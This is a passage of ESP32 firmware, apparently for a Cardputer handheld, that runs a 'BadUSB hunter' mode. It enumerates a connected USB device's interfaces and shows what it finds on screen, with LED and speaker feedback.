      if (usb_host_get_active_config_descriptor(dev_hdl, &config_desc) == ESP_OK) {
        int offset = 0;
        const usb_standard_desc_t *next_desc = (const usb_standard_desc_t *)config_desc;
        while (offset < config_desc->wTotalLength && badusb_currentDevice.numInterfaces < 8) {
          next_desc = (const usb_standard_desc_t *)(((uint8_t *)config_desc) + offset);
          if (next_desc->bDescriptorType == USB_B_DESCRIPTOR_TYPE_INTERFACE) {
            const usb_intf_desc_t *intf_desc = (const usb_intf_desc_t *)next_desc;
            badusb_currentDevice.interfaceClasses[badusb_currentDevice.numInterfaces] = intf_desc->bInterfaceClass;
            badusb_currentDevice.numInterfaces++;
          }
          offset += next_desc->bLength;
        }
      }
    }
    usb_host_device_close(badusb_client_hdl, dev_hdl);
    badusb_analyzeDevice(&badusb_currentDevice);
    badusb_displayDeviceInfo(&badusb_currentDevice);
  }
}

void badusb_cleanup() {
  badusb_leds[0] = CRGB::Black; FastLED.show();
  if (badusb_client_hdl) { usb_host_client_deregister(badusb_client_hdl); badusb_client_hdl = nullptr; }
  usb_host_uninstall();
  memset(&badusb_currentDevice, 0, sizeof(badusb_currentDevice));
  badusb_deviceConnected = false; badusb_deviceWasConnected = false;
  badusb_ledState = false; badusb_lastBlinkTime = 0;
}

void badusb_hunter_setup() {
  DISP.setRotation(1); DISP.setTextSize(SMALL_TEXT); DISP.setTextColor(TFT_WHITE);
  badusb_displayWelcome();
  FastLED.addLeds<WS2812, BADUSB_LED_PIN, GRB>(badusb_leds, BADUSB_NUM_LEDS);
  FastLED.setBrightness(50); badusb_leds[0] = CRGB::Black; FastLED.show();
  SPEAKER.begin();
  const usb_host_config_t host_config = { .skip_phy_setup = false, .intr_flags = ESP_INTR_FLAG_LEVEL1 };
  esp_err_t err = usb_host_install(&host_config);
  if (err != ESP_OK) { DISP.setTextColor(TFT_RED); DISP.print("USB Host FAIL: "); DISP.println(err, HEX); delay(2000); return; }
  const usb_host_client_config_t client_config = {
    .is_synchronous = true, .max_num_event_msg = 5,
    .async = { .client_event_callback = nullptr, .callback_arg = nullptr }
  };
  err = usb_host_client_register(&client_config, &badusb_client_hdl);
  if (err != ESP_OK) {
    DISP.setTextColor(TFT_RED); DISP.print("Client reg FAIL: "); DISP.println(err, HEX);
    delay(2000); usb_host_uninstall(); return;
  }
  badusb_deviceConnected = false; badusb_deviceWasConnected = false;
}

void badusb_hunter_loop() {
  badusb_updateLED(); check_select_press();
  if (check_next_press()) { badusb_cleanup(); isSwitching = true; current_proc = 1; return; }
  uint8_t dev_addr_list[10]; int num_devices = 0;
  esp_err_t err = usb_host_device_addr_list_fill(10, dev_addr_list, &num_devices);
  if (err == ESP_OK) {
    if (num_devices > 0 && !badusb_deviceConnected) {
      badusb_processNewDevice(dev_addr_list[0]); badusb_deviceWasConnected = true;
    } else if (num_devices == 0 && badusb_deviceWasConnected) {
      DISP.fillScreen(BGCOLOR); DISP.setTextSize(SMALL_TEXT);
      DISP.setTextColor(TFT_YELLOW); DISP.println("DISCONNECTED"); delay(500);
      memset(&badusb_currentDevice, 0, sizeof(badusb_currentDevice));
      badusb_deviceConnected = false;
      badusb_leds[0] = CRGB::Black; FastLED.show();
      badusb_displayWelcome(); badusb_deviceWasConnected = false;
    }
  }
  usb_host_lib_handle_events(10, nullptr);
  delay(100);
}

#endif // CARDPUTER
